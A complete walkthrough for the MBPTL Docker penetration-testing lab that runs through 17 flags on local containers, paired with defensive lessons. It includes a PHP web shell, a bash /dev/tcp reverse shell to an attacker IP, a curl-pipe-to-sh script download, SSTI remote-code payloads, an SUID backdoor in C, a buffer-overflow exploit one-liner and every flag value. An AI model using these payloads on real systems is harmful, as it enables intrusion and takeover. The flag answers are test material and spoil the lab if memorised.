# Most Basic Penetration Testing Lab (MBPTL) - Complete Write-up

**Self-deployed straightforward hacking lab machine designed for newcomers who want to learn Penetration Testing, running inside Docker for easy setup.**

- **Repository:** https://github.com/bayufedra/MBPTL
- **Author:** Bayu Fedra

---

## Table of Contents

1. [Introduction](#introduction)
2. [Lab Overview](#lab-overview)
3. [Setup Instructions](#setup-instructions)
4. [Phase 1: Reconnaissance (Flags 1-3)](#phase-1-reconnaissance-flags-1-3)
5. [Phase 2: Web Enumeration (Flag 4)](#phase-2-web-enumeration-flag-4)
6. [Phase 3: SQL Injection (Flags 5-7)](#phase-3-sql-injection-flags-5-7)
7. [Phase 4: File Upload & Web Shell (Flag 7 Continued)](#phase-4-file-upload--web-shell-flag-7-continued)
8. [Phase 5: Post-Exploitation (Flags 8-9)](#phase-5-post-exploitation-flags-8-9)
9. [Phase 6: SOC Analysis (Flags 10-12)](#phase-6-soc-analysis-flags-10-12)
10. [Phase 7: Network Pivoting (Flags 13-14)](#phase-7-network-pivoting-flags-13-14)
11. [Phase 8: Binary Exploitation (Flags 15-17)](#phase-8-binary-exploitation-flags-15-17)
12. [Lessons Learned](#lessons-learned)
13. [Appendix: Tools Used](#appendix-tools-used)

---

## Introduction

This write-up provides a complete, step-by-step walkthrough of the MBPTL penetration testing lab. The lab simulates a realistic multi-container environment with web applications, databases, and internal services. Throughout this journey, you'll discover 17 flags while learning fundamental penetration testing techniques.

---

## Phase 1: Reconnaissance (Flags 1-3)

Reconnaissance is the first phase of any penetration test. We gather information about the target to identify potential attack vectors.

### 🔍 Flag 1: Page Source Analysis

**Objective:** Discover hidden information in the main web page source code.

**Method:** View page source in browser or use command line tools.

**Steps:**

1. Access the main application:
   ```bash
   curl http://localhost:80
   ```

2. Or open in browser: http://localhost:80

3. View page source (Right-click → View Page Source in browser)

4. Look for HTML comments containing the flag

**Flag Found:**
```html
<!-- MBPTL-1{bf094c0b92d13d593cbff56b3c57ad4d} -->
```

**🏆 Flag 1:** `MBPTL-1{bf094c0b92d13d593cbff56b3c57ad4d}`

**Learning:** Always check source code! Developers often leave comments, debug information, or even credentials in page sources.

---

### 🔍 Flag 2: HTTP Header Analysis

**Objective:** Extract information from HTTP response headers.

**Method:** Use `curl -I` to fetch headers only, or browser developer tools.

**Steps:**

```bash
curl -I http://localhost:80
```

**Output:**
```
HTTP/1.1 200 OK
Date: Thu, 07 Mar 2024 14:38:43 GMT
Server: Apache/2.4.52 (Debian)
X-Powered-By: PHP/7.3.33
X-MBPTL: MBPTL-2{10e0daf1aefdfa42ba53f1d03dc3b7da}
Content-Type: text/html; charset=UTF-8
```

**🏆 Flag 2:** `MBPTL-2{10e0daf1aefdfa42ba53f1d03dc3b7da}`

**Learning:** Custom HTTP headers often contain developer notes, version information, or flags. Always examine headers carefully.

---

### 🔍 Flag 3: Alternative Web Service Discovery

**Objective:** Discover additional web services on non-standard ports.

**Method:** Access web service on port 8080 discovered during reconnaissance.

**Steps:**

1. Access the alternative web service:
   ```bash
   curl http://localhost:8080
   ```

2. Or open in browser: http://localhost:8080

**Output:**
```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Under Maintenance</title>
    ...
    <p>MBPTL-3{f74dc48447423d67699b233c461227a4}</p>
</html>
```

**🏆 Flag 3:** `MBPTL-3{f74dc48447423d67699b233c461227a4}`

**Learning:** Always scan all open ports, not just the common ones. Services on non-standard ports may have weaker security controls.

---

### Enhanced Reconnaissance

Let's perform a comprehensive port scan to identify all services:

```bash
# Install nmap if needed
# Ubuntu/Debian: sudo apt install nmap
# macOS: brew install nmap

# Perform basic port scan
nmap localhost
```

**Port Scan Results:**
```
Nmap scan report for localhost
Host is up (0.00073s latency).
Not shown: 997 filtered ports
PORT     STATE SERVICE
80/tcp   open  http
8080/tcp open  http-proxy
```

**Analysis:**
- Both ports host HTTP services
- Port 80: Main bookstore application
- Port 8080: Administrator panel

---

## Phase 2: Web Enumeration (Flag 4)

Directory enumeration helps us discover hidden files and directories that might reveal sensitive information or functionality.

### 🔍 Flag 4: Administrator Panel Discovery

**Objective:** Discover the administrator login panel through directory enumeration.

**Method:** Directory scanning using tools like `dirsearch`, `gobuster`, or manual browsing.

**Steps:**

1. **Install dirsearch** (if not available):
   ```bash
   git clone https://github.com/maurosoria/dirsearch
   cd dirsearch
   pip3 install -r requirements.txt
   ```

2. **Scan port 8080**:
   ```bash
   python3 dirsearch.py -u http://localhost:8080/
   ```

**Scan Results:**
```
Target: http://localhost:8080/

[21:20:24] Starting:
[21:21:26] 301 -  331B  - /administrator  ->  http://localhost:8080/administrator/
[21:21:26] 200 -    2KB - /administrator/
[21:21:26] 200 -    2KB - /administrator/index.php
```

3. **Access the administrator panel**:
   ```bash
   curl http://localhost:8080/administrator/
   ```

   Or open: http://localhost:8080/administrator/

**Output:**
```html
<!DOCTYPE html>
<html lang="en">
...
<div class="container">
    <center>
        <p>MBPTL-4{eb75482e45154917d44882e0c4a8e68f}</p>
    </center>
</div>
```

**🏆 Flag 4:** `MBPTL-4{eb75482e45154917d44882e0c4a8e68f}`

**Learning:** Always enumerate directories and files. Hidden administrative panels often have weaker authentication or known default credentials.

---

## Phase 3: SQL Injection (Flags 5-7)

SQL Injection is one of the most common and dangerous web application vulnerabilities. In this phase, we'll discover, exploit, and leverage SQL injection to gain unauthorized access.

### 🔍 Flag 5: SQL Injection Vulnerability Discovery

**Objective:** Identify SQL injection vulnerability in the bookstore application.

**Method:** Manual testing of the `id` parameter in `detail.php`.

**Steps:**

1. **Explore the main application**:
   - Visit http://localhost:80
   - Click on any book to view details
   - Notice the URL: `http://localhost:80/detail.php?id=1`

2. **Test for SQL injection**:
   ```bash
   curl "http://localhost:80/detail.php?id=1'"
   ```

   Or try in browser: `http://localhost:80/detail.php?id=1'`

**Error Output:**
```
Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' LIMIT 1' at line 1

MBPTL-5{4bcce60b74914398c04eb5b546995408}
```

**🏆 Flag 5:** `MBPTL-5{4bcce60b74914398c04eb5b546995408}`

**Learning:** The single quote (`'`) broke the SQL query, confirming the vulnerability. The application directly concatenates user input into the SQL query without proper sanitization.

**Vulnerable Code Analysis:**
```php
$sql = "SELECT * FROM books WHERE id = {$_GET['id']} LIMIT 1";
```

This is vulnerable because user input is inserted directly without parameterization.

---

### 🔧 Flag 6: Database Flag Extraction

**Objective:** Use SQL injection to extract flags from the database.

**Method:** Automated exploitation with SQLMap, the industry-standard SQL injection tool.

**Steps:**

1. **Install SQLMap** (if not available):
   ```bash
   git clone https://github.com/sqlmapproject/sqlmap
   cd sqlmap
   ```

2. **Enumerate databases**:
   ```bash
   python3 sqlmap.py -u "http://localhost:80/detail.php?id=1" --dbs --batch
   ```

   The `--batch` flag automatically answers "yes" to all prompts.

**Output:**
```
[INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian
web application technology: Apache 2.4.52, PHP 7.3.33
back-end DBMS: MySQL >= 5.6

available databases [6]:
[*] administrator
[*] bookstore
[*] information_schema
[*] mysql
[*] performance_schema
[*] sys
```

**Analysis:**
- The `administrator` database looks promising!
- `bookstore` contains the main application data
- System databases (`information_schema`, `mysql`, etc.) are typically not of interest

3. **Dump the administrator database**:
   ```bash
   python3 sqlmap.py -u "http://localhost:80/detail.php?id=1" -D administrator --dump --batch
   ```

**Output:**
```
Database: administrator

Table: users
[1 entry]
+----+----------------------------------+----------+
| id | password                         | username |
+----+----------------------------------+----------+
| 1  | 8a24367a1f46c141048752f2d5bbd14b | admin    |
+----+----------------------------------+----------+

Table: flag
[1 entry]
+----+--------------------------------------------+
| id | flag                                       |
+----+--------------------------------------------+
| 1  | MBPTL-6{9fce407640f5425f688c98039bc67ee6} |
+----+--------------------------------------------+
```

**🏆 Flag 6:** `MBPTL-6{9fce407640f5425f688c98039bc67ee6}`

**Learning:** SQL injection allows complete database compromise. We extracted:
- Admin credentials (username + password hash)
- Flags stored in the database

---

### 🔐 Cracking the Password Hash

**Objective:** Decrypt the MD5 password hash to gain admin access.

**Method:** Online hash cracking or local tools.

**Steps:**

1. **Identify hash type**:
   - Hash: `8a24367a1f46c141048752f2d5bbd14b`
   - Length: 32 characters
   - Format: Hexadecimal
   - **Type: MD5**

2. **Crack the hash**:
   - **Option A:** Online cracking (https://hashes.com/en/decrypt/hash)
   - **Option B:** Local cracking with Hashcat or John the Ripper

   **Online Result:** `P@ssw0rd!`

3. **Credentials obtained**:
   - Username: `admin`
   - Password: `P@ssw0rd!`

**Learning:** Always hash passwords with strong algorithms like bcrypt or Argon2. MD5 is cryptographically broken and easily cracked.

---

### 🚪 Flag 7: Admin Panel Access

**Objective:** Successfully log into the administrator panel using compromised credentials.

**Method:** Use extracted credentials to authenticate.

**Steps:**

1. **Navigate to login page**:
   http://localhost:8080/administrator/

2. **Enter credentials**:
   - Username: `admin`
   - Password: `P@ssw0rd!`

3. **After successful login**, you'll be redirected to `admin.php`

**Login Code Analysis:**
```php
$username = mysqli_real_escape_string($conn, $_POST['username']);
$password = md5(mysqli_real_escape_string($conn, $_POST['password']));
$query = "SELECT * FROM users WHERE username = '{$username}' AND password = '{$password}'";
```

**Note:** While the login uses `mysqli_real_escape_string()`, the password comparison uses a weak MD5 hash.

4. **Flag is displayed on the admin panel**:
   ```html
   <div class="container">
       <center>
           <p>MBPTL-7{e77ac27271c6e54470db47228b9eca09}</p>
       </center>
   </div>
   ```

**🏆 Flag 7:** `MBPTL-7{e77ac27271c6e54470db47228b9eca09}`

**Learning:** Weak authentication mechanisms combined with database breaches create a perfect storm for attackers.

---

## Phase 4: File Upload & Web Shell (Flag 7 Continued)

Now that we have admin access, let's exploit the file upload vulnerability to gain code execution on the server.

### 📤 File Upload Vulnerability

**Objective:** Upload a malicious PHP file to gain remote code execution.

**Method:** Exploit the unsecured file upload functionality.

**Steps:**

1. **Analyze the upload form** in `admin.php`:
   - The form accepts image uploads
   - Files are saved with random MD5-based names
   - Upload directory: `administrator/uploads/`

2. **Create a simple PHP web shell**:
   
   Create a file named `shell.php`:
   ```php
   <?php system($_GET["command"]); ?>
   ```

   This simple shell allows us to execute system commands via URL parameters.

3. **Upload the shell**:
   - Fill in book details (any values work)
   - Select `shell.php` as the image file
   - Click "Insert Book"

4. **Confirm upload**:
   You should see: `Book inserted successfully!`

**Vulnerability Analysis:**
```php
$imageExtension = end(explode('.', $imageName));
$targetFile = $targetDirectory . md5(time() . rand() . $imageName) . '.' . $imageExtension;
```

**The problem:** The extension is taken from the original filename and appended without validation. An attacker can upload a `.php` file disguised as an image.

---

### 🎯 Locating the Uploaded File

**Objective:** Find where our uploaded shell is stored.

**Method:** Examine uploaded file locations or use directory listing.

**Steps:**

1. **Return to main bookstore**:
   http://localhost:80

2. **Click "View Details" on any uploaded book**

3. **Right-click the broken image** → "Open Image in New Tab"

4. **Observe the URL**:
   ```
   http://localhost:80/administrator/uploads/[some_hash].php
   ```

5. **Test command execution**:
   ```bash
   curl "http://localhost:80/administrator/uploads/[YOUR_HASH].php?command=whoami"
   ```

   Replace `[YOUR_HASH]` with your actual filename.

**Output:**
```
www-data
```

**Learning:** Always validate file types on both client and server side. Store uploaded files outside the web root when possible.

---

### 🧩 Reading the User Flag (Flag 8)

**Objective:** Extract the user-level flag using our web shell.

**Method:** Use command execution to read files.

**Steps:**

1. **List the /flag directory**:
   ```bash
   curl "http://localhost:80/administrator/uploads/[YOUR_HASH].php?command=ls%20-lah%20/flag"
   ```

   URL-encoded space: `%20`

**Output:**
```
total 20K
drwxr-xr-x 1 root root 4.0K Feb 27 14:44 .
drwxr-xr-x 1 root root 4.0K Feb 27 14:46 ..
---------- 1 root root   40 Feb 27 14:40 root.txt
-rw-rw-r-- 1 root root   40 Feb 27 14:40 user.txt
```

2. **Read the user flag**:
   ```bash
   curl "http://localhost:80/administrator/uploads/[YOUR_HASH].php?command=cat%20/flag/user.txt"
   ```

**Output:**
```
MBPTL-8{e284ebd7a0008f5f3a5ca02cc3e4764b}
```

**🏆 Flag 8:** `MBPTL-8{e284ebd7a0008f5f3a5ca02cc3e4764b}`

**Note:** `root.txt` has permissions `----------` (no access), so we need privilege escalation.

---

## Phase 5: Post-Exploitation (Flags 8-9)

Post-exploitation involves maintaining access, escalating privileges, and gathering sensitive information.

### 🔄 Establishing a Reverse Shell

**Objective:** Replace the web shell with a persistent reverse shell connection.

**Method:** Create a reverse shell using netcat or bash.

**Steps:**

1. **On your attacking machine**, start a listener:
   ```bash
   nc -lvnp 1337
   ```

2. **Create a reverse shell PHP file** (`reverse.php`):
   ```php
   <?php system('bash -c "bash -i >& /dev/tcp/192.168.56.1/1337 0>&1"'); ?>
   ```
   
   **Replace** `192.168.56.1` with your machine's IP address.
   
   **To find your IP:**
   ```bash
   # Linux/macOS
   ip addr show
   
   # Windows
   ipconfig
   ```

3. **Upload and execute** the reverse shell

4. **Check your listener** - you should see:
   ```
   bash: cannot set terminal process group (1): Inappropriate ioctl for device
   bash: no job control in this shell
   www-data@container-id:/var/www/html/administrator/uploads$
   ```

**Learning:** Reverse shells provide stable, interactive access to the compromised system.

---

### 🔍 Privilege Escalation Enumeration

**Objective:** Identify methods to escalate to root.

**Method:** Use LinPEAS (Linux Privilege Escalation Awesome Script).

**Steps:**

1. **Download and run LinPEAS**:
   ```bash
   curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
   ```

2. **Search LinPEAS output** for interesting findings:
   
   Look for: `You can write SUID file: /bin/bahs`

**Finding:**
```
SUID - Check easy privesc, exploits and write perms:
You can write SUID file: /bin/bahs
```

**Analysis:** `/bin/bahs` is a misspelled `/bin/bash` with SUID permissions owned by root!

---

### 👑 Root Privilege Escalation (Flag 9)

**Objective:** Exploit the SUID binary to gain root access.

**Method:** Execute the misspelled binary which has root SUID.

**Steps:**

1. **Check the SUID binary**:
   ```bash
   ls -lah /bin/bahs
   ```

**Output:**
```
-rwsr-xr-x 1 root root 15104 Feb 27 14:44 /bin/bahs
```

2. **Execute bahs**:
   ```bash
   /bin/bahs
   ```

3. **Verify root access**:
   ```bash
   id
   ```

**Output:**
```
uid=0(root) gid=0(root) groups=0(root)
```

4. **Read the root flag**:
   ```bash
   cat /flag/root.txt
   ```

**Output:**
```
MBPTL-9{74ac6fef30abfc98e8532548b9742050}
```

**🏆 Flag 9:** `MBPTL-9{74ac6fef30abfc98e8532548b9742050}`

**Learning:** 
- SUID binaries run with the owner's privileges
- Misconfigured SUID binaries are a common privilege escalation vector
- Always audit SUID binaries on systems

**Rootkit Analysis:**
The `/bin/bahs` file was created from this C code:
```c
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <sys/types.h>

int main(){
    setuid(0);
    setgid(0);
    system("/bin/bash");
    return 0;
}
```

Compiled with SUID permissions, this creates a persistent backdoor.

---

## Phase 6: SOC Analysis (Flags 10-12)

From a Security Operations Center (SOC) perspective, understanding what logged activity looks like helps defenders detect and respond to attacks. Let's examine logs and system files as a SOC analyst would.

### 📊 Flag 10: Web Access Log Analysis

**Objective:** Review Apache access logs from a SOC perspective.

**Method:** Read `/var/log/apache2/access.log`.

**Steps:**

```bash
cat /var/log/apache2/access.log
```

**Output:**
```
FLAG10='MBPTL-10{c1835d7d28a5394b38cfbf6f813a1553}'
127.0.0.1 - - [01/Jan/2025:00:00:00 +0000] "GET / HTTP/1.1" 200 1234 "-" "curl/7.68.0"
...
```

**🏆 Flag 10:** `MBPTL-10{c1835d7d28a5394b38cfbf6f813a1553}`

**SOC Learning:** 
- Web access logs record all HTTP requests
- Indicators include unusual URLs, user agents, and request patterns
- This helps detect reconnaissance, exploitation attempts, and data exfiltration

---

### 📝 Flag 11: Command History Analysis

**Objective:** Examine root's command history.

**Method:** Read `/root/.bash_history`.

**Steps:**

```bash
cat /root/.bash_history
```

**Output:**
```
FLAG11='MBPTL-11{c2090290b9012cd448129e26626c8cde}'
```

**🏆 Flag 11:** `MBPTL-11{c2090290b9012cd448129e26626c8cde}`

**SOC Learning:**
- Command history files track executed commands
- Anomalies in history may indicate compromise
- Compare timestamps with other system logs

---

### ⚙️ Flag 12: Shell Configuration Analysis

**Objective:** Check root's shell configuration.

**Method:** Read `/root/.bashrc`.

**Steps:**

```bash
cat /root/.bashrc
```

**Output:**
```
FLAG12='MBPTL-12{a475806f05e0416bcd8cde2d02dfde95}'
```

**🏆 Flag 12:** `MBPTL-12{a475806f05e0416bcd8cde2d02dfde95}`

**SOC Learning:**
- Configuration files can be modified for persistence
- Always monitor changes to `.bashrc`, `.bash_profile`, and `.ssh/`
- Use file integrity monitoring (FIM) tools

---

## Phase 7: Network Pivoting (Flags 13-14)

Now that we have root access, we can pivot to internal services that weren't directly accessible. Pivoting allows attackers to move laterally through the network.

### 🔍 Network Discovery

**Objective:** Identify other systems on the internal network.

**Method:** Use network scanning and interface inspection.

**Steps:**

1. **Check network interfaces**:
   ```bash
   ip addr show
   ```

2. **Scan the Docker internal network**:
   ```bash
   nmap -sn 172.17.0.0/16
   ```

**Results:**
```
Nmap scan report for mbptl-app (172.18.0.4)
Host is up (0.0001s latency).

Nmap scan report for mbptl-internal (172.18.0.3)
Host is up (0.0001s latency).
```

3. **Port scan the discovered hosts**:
   ```bash
   nmap -p- mbptl-app
   nmap -p- mbptl-internal
   ```

**Results:**
```
# mbptl-app
PORT     STATE SERVICE
5000/tcp open  upnp

# mbptl-internal
PORT      STATE SERVICE
31337/tcp open  Elite
```

---

### 🌐 Flag 13: Internal Application Discovery

**Objective:** Access the internal Flask web application.

**Method:** Use curl from the compromised host.

**Steps:**

1. **Access the internal service** (from the compromised `mbptl-main` shell, since the port is not exposed to the host):
   ```bash
   curl http://mbptl-app:5000/
   ```

**Output:**
```html
<html>
    <head>
        <title>MBPTL - Internal Web Service</title>
    </head>
    <body>
        <center>
            <h1><b>MBPTL - Internal Web Service</b></h1>
        </center>
        <p>Hello, World! (/?name=)</p>
        <p>MBPTL-13{b20c7cd75fd17802261d0725ae2eb733}</p>
    </body>
</html>
```

**🏆 Flag 13:** `MBPTL-13{b20c7cd75fd17802261d0725ae2eb733}`

**Learning:** Internal services often have weaker security since they're not exposed externally.

---

### 💉 Flag 14: Server-Side Template Injection (SSTI)

**Objective:** Exploit the SSTI vulnerability to execute commands.

**Method:** Inject malicious template code (run all requests from inside the Docker network/pivoted shell).

**Steps:**

1. **Examine the application**:
   ```bash
   curl "http://mbptl-app:5000/?name=test"
   ```

   Notice the URL parameter `name` is rendered in the HTML.

2. **Analyze the vulnerable code** (`mbptl-app/app.py`):
   ```python
   from flask import Flask, request, render_template_string
   
   @app.route("/")
   def home():
       name = request.args.get('name', 'World! (/?name=)')
       return render_template_string("""...
       <p>Hello, %s</p>
       ...
   """ %name)
   ```

   **Vulnerability:** The `render_template_string` with `%` formatting allows code injection.

3. **Test for template injection**:
   ```bash
   curl "http://mbptl-app:5000/?name={{7*7}}"
   ```

   **Expected:** Displays `49` if vulnerable

4. **Execute system commands**:
   ```bash
   curl "http://mbptl-app:5000/?name={{request.application.__globals__.__builtins__.__import__('os').popen('cat+/flag.txt').read()}}"
   ```

   URL-encoded space: `+` or `%20`

**Output:**
```html
<p>Hello, MBPTL-14{c64184222cff6005e728bbfc2a672fe4}
</p>
```

**🏆 Flag 14:** `MBPTL-14{c64184222cff6005e728bbfc2a672fe4}`

**Alternative methods:**
```bash
# Using Flask-specific SSTI payload
curl "http://mbptl-app:5000/?name={{''.__class__.__mro__[1].__subclasses__()}}"

# Reading flag with subprocess
curl "http://mbptl-app:5000/?name={{request.application.__globals__.__builtins__.__import__('subprocess').check_output('cat+/flag.txt',shell=True)}}"
```

**Learning:**
- Server-Side Template Injection allows code execution
- Always use safe templating practices
- Never render user input directly in templates

---

## Phase 8: Binary Exploitation (Flags 15-17)

Binary exploitation involves finding and exploiting vulnerabilities in compiled programs. In this phase, we'll analyze and exploit a buffer overflow vulnerability.

### 📥 Downloading the Binary

**Objective:** Obtain the vulnerable binary for analysis.

**Method:** Use the download feature in the admin panel.

**Steps:**

1. **Access the download link** in the admin panel:
   - Click: "Download Binary for MBPTL Internal Service"
   - Or visit: http://localhost:8080/administrator/main

2. **Save the binary** as `mbptl-internal-binary`

---

### 🔬 Flag 15: Binary Analysis

**Objective:** Extract embedded flag through static analysis.

**Method:** Use `strings` to extract readable text.

**Steps:**

1. **Analyze file type**:
   ```bash
   file mbptl-internal-binary
   ```

**Output:**
```
mbptl-internal-binary: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=..., for GNU/Linux 3.2.0, not stripped
```

2. **Extract strings**:
   ```bash
   strings mbptl-internal-binary | grep MBPTL
   ```

**Output:**
```
MBPTL-15{cb4ca713115bfa8691b8577187a747e0}
```

**🏆 Flag 15:** `MBPTL-15{cb4ca713115bfa8691b8577187a747e0}`

---

### 🔍 Binary Vulnerability Analysis

**Objective:** Understand the vulnerability and exploitation technique.

**Method:** Disassemble the binary and examine source code.

**Steps:**

1. **Disassemble the binary**:
   ```bash
   objdump -d mbptl-internal-binary > disassembly.txt
   ```

2. **Search for the secret function**:
   ```bash
   objdump -d mbptl-internal-binary | grep secret
   ```

**Output:**
```
00000000004006c6 <__secret>:
  4006c6:       55                      push   %rbp
  4006c7:       48 89 e5                mov    %rsp,%rbp
  4006ca:       48 83 ec 10             sub    $0x10,%rsp
  4006ce:       48 8d 3d 4b 01 00 00    lea    0x14b(%rip),%rdi
  4006d5:       e8 96 fe ff ff          call   400570 <system@plt>
  4006da:       90                      nop
  4006db:       c9                      leave
  4006dc:       c3                      ret
```

3. **Examine source code** (`mbptl-internal/main.c`):
   ```c
   #include<stdio.h>
   #include<stdlib.h>
   #include<string.h>
   
   // gcc main.c -o main -no-pie -fno-pic -fno-stack-protector -z execstack
   
   void __secret(){
       system("/bin/sh");
   }
   
   int main(){
       char buff[128];
       char flag15[128] = "MBPTL-15{cb4ca713115bfa8691b8577187a747e0}";
       
       printf("=== [ MBPTL INTERNAL SERVICE ] ===\n");
       printf("[!] Flag 16: ");
       system("cat flag16.txt");
       printf("[>] Name: ");
       gets(buff);  // VULNERABLE!
       printf("[*] Welcome, %s!\n", &buff);
       return 0;
   }
   ```

**Vulnerability Analysis:**

1. **Unsafe function**: `gets()` reads input without bounds checking
2. **Buffer size**: 128 bytes
3. **No protections**: Compiled without:
   - PIE (Position Independent Executable)
   - Stack canaries
   - ASLR
4. **Hidden function**: `__secret()` runs `/bin/sh` as root

---

### 💣 Exploitation Strategy

**Objective:** Overflow the buffer and redirect execution to `__secret()`.

**Method:** Craft a payload that overwrites the return address.

**Steps:**

1. **Calculate offset**:
   ```
   Buffer: 128 bytes
   Saved RBP: 8 bytes
   ──────────────────
   Total: 136 bytes to return address
   ```

2. **Target address**:
   - Secret function: `0x00000000004006c6`

3. **Craft payload**:
   ```
   [136 bytes padding] + [address of __secret()]
   ```

---

### 💥 Flag 16: Internal Service Access

**Objective:** Connect to the vulnerable service and observe Flag 16.

**Method:** Use netcat to connect to the service.

**Steps:**

1. **Determine the internal IP**:
   ```bash
   nmap -sn 172.17.0.0/16 | grep mbptl-internal
   ```

2. **Connect to the service** (from a shell on `mbptl-main` or another pivoted host):
   ```bash
   nc mbptl-internal 31337
   ```

**Output:**
```
=== [ MBPTL INTERNAL SERVICE ] ===
[!] Flag 16: MBPTL-16{1fb837a73ba131c382cc9bc53d4442f0}
[>] Name:
```

**🏆 Flag 16:** `MBPTL-16{1fb837a73ba131c382cc9bc53d4442f0}`

---

### ⚡ Flag 17: Buffer Overflow Exploitation

**Objective:** Exploit the buffer overflow to gain a shell.

**Method:** Send a crafted payload using Python.

**Steps:**

1. **Create the exploit**:
   
   Using Python 3:
   ```bash
   (python3 -c 'import struct, sys; sys.stdout.buffer.write(b"A"*136 + struct.pack("<Q", 0x00000000004006c6))'; cat -) | nc mbptl-internal 31337
   ```

   **Breakdown:**
   - `b"A"*136`: Fill buffer (128 bytes) + RBP (8 bytes)
   - `struct.pack("<Q", 0x00000000004006c6)`: Pack the secret function address as little-endian 64-bit
   - `cat -`: Keep the connection open for interactive shell

2. **From root shell on mbptl-main**:
   ```bash
   (python3 -c 'import struct, sys; sys.stdout.buffer.write(b"A"*136 + struct.pack("<Q", 0x00000000004006c6))'; cat -) | nc 172.18.0.4 31337
   ```

   Adjust IP based on your Docker network configuration.

3. **Verify shell**:
   ```bash
   id
   ls -lah
   cat flag.txt
   ```

**Output:**
```
id
uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)

ls -lah
total 36K
drwxr-xr-x 1 nobody nogroup 4.0K Feb 27 14:44 .
drwxr-xr-x 1 root   root    4.0K Feb 27 14:46 ..
-r-xr-xr-x 1 nobody nogroup 9.3K Feb 27 14:44 main
-rw-r--r-- 1 nobody nogroup   40 Feb 27 14:40 flag.txt
-rw-r--r-- 1 nobody nogroup   42 Feb 27 14:40 flag16.txt

cat flag.txt
MBPTL-17{03762a502a18e260a47da040eaae38fa}
```

**🏆 Flag 17:** `MBPTL-17{03762a502a18e260a47da040eaae38fa}`

**Learning:**
- Buffer overflows allow arbitrary code execution
- Use safe functions like `fgets()` instead of `gets()`
- Enable security features: PIE, stack canaries, NX/ASLR
- Input validation is crucial

---

## 🎉 Complete Flag Summary

| Flag | Description | Value |
|------|-------------|-------|
| **Flag 1** | Page Source Analysis | `MBPTL-1{bf094c0b92d13d593cbff56b3c57ad4d}` |
| **Flag 2** | HTTP Header Analysis | `MBPTL-2{10e0daf1aefdfa42ba53f1d03dc3b7da}` |
| **Flag 3** | Alternative Web Service | `MBPTL-3{f74dc48447423d67699b233c461227a4}` |
| **Flag 4** | Administrator Panel | `MBPTL-4{eb75482e45154917d44882e0c4a8e68f}` |
| **Flag 5** | SQL Injection Discovery | `MBPTL-5{4bcce60b74914398c04eb5b546995408}` |
| **Flag 6** | Database Extraction | `MBPTL-6{9fce407640f5425f688c98039bc67ee6}` |
| **Flag 7** | Admin Panel Access | `MBPTL-7{e77ac27271c6e54470db47228b9eca09}` |
| **Flag 8** | User Flag | `MBPTL-8{e284ebd7a0008f5f3a5ca02cc3e4764b}` |
| **Flag 9** | Root Flag | `MBPTL-9{74ac6fef30abfc98e8532548b9742050}` |
| **Flag 10** | Web Access Log | `MBPTL-10{c1835d7d28a5394b38cfbf6f813a1553}` |
| **Flag 11** | Command History | `MBPTL-11{c2090290b9012cd448129e26626c8cde}` |
| **Flag 12** | Shell Configuration | `MBPTL-12{a475806f05e0416bcd8cde2d02dfde95}` |
| **Flag 13** | Internal App Discovery | `MBPTL-13{b20c7cd75fd17802261d0725ae2eb733}` |
| **Flag 14** | SSTI Exploitation | `MBPTL-14{c64184222cff6005e728bbfc2a672fe4}` |
| **Flag 15** | Binary Analysis | `MBPTL-15{cb4ca713115bfa8691b8577187a747e0}` |
| **Flag 16** | Service Discovery | `MBPTL-16{1fb837a73ba131c382cc9bc53d4442f0}` |
| **Flag 17** | Buffer Overflow | `MBPTL-17{03762a502a18e260a47da040eaae38fa}` |

---

## Lessons Learned

### 🔐 Security Best Practices

1. **Input Validation**
   - Always validate and sanitize user input
   - Use parameterized queries/prepared statements for SQL
   - Implement strict file upload validation

2. **Authentication & Authorization**
   - Use strong password hashing (bcrypt, Argon2)
   - Implement proper session management
   - Enforce least privilege access

3. **Secure Coding**
   - Avoid dangerous functions like `gets()`
   - Enable compiler security features
   - Follow secure coding guidelines (OWASP, CWE)

4. **Network Security**
   - Implement proper network segmentation
   - Monitor lateral movement
   - Restrict internal service access

5. **Defense in Depth**
   - Multiple security layers
   - Regular security audits
   - Incident response procedures

### 🛠️ Detection & Response

1. **Logging & Monitoring**
   - Centralized log collection
   - Real-time alerting
   - Baseline normal behavior

2. **SOC Capabilities**
   - Log analysis skills
   - Threat intelligence integration
   - Incident triage workflows

---

## Appendix: Tools Used

### 🔍 Reconnaissance
- **Browser Developer Tools**: Inspect page sources and headers
- **curl**: Command-line HTTP client
- **nmap**: Network scanning and enumeration

### 🌐 Web Enumeration
- **dirsearch**: Directory and file discovery
- **gobuster**: Alternative directory brute-forcer
- **Burp Suite**: Manual web application testing

### 💣 Exploitation
- **SQLMap**: Automated SQL injection exploitation
- **Custom Web Shells**: PHP-based remote command execution
- **Netcat**: Reverse shells and network pivoting
- **Python**: Payload generation and automation

### 🔐 Password Cracking
- **Hashcat**: Local hash cracking
- **John the Ripper**: Alternative hash cracker
- **Online Hash Databases**: Quick hash lookup

### 🔬 Post-Exploitation
- **LinPEAS**: Privilege escalation enumeration
- **strings**: Binary static analysis
- **objdump**: Binary disassembly

### 🧪 Binary Exploitation
- **gdb**: Debugging and binary analysis
- **struct** (Python): Binary data packing
- **objdump**: Assembly code analysis


**Happy Hacking! 🚀**

---

*For questions, suggestions, or contributions, please visit:*  
**https://github.com/bayufedra/MBPTL**

**Author:** Bayu Fedra  
**License:** GPL-3.0
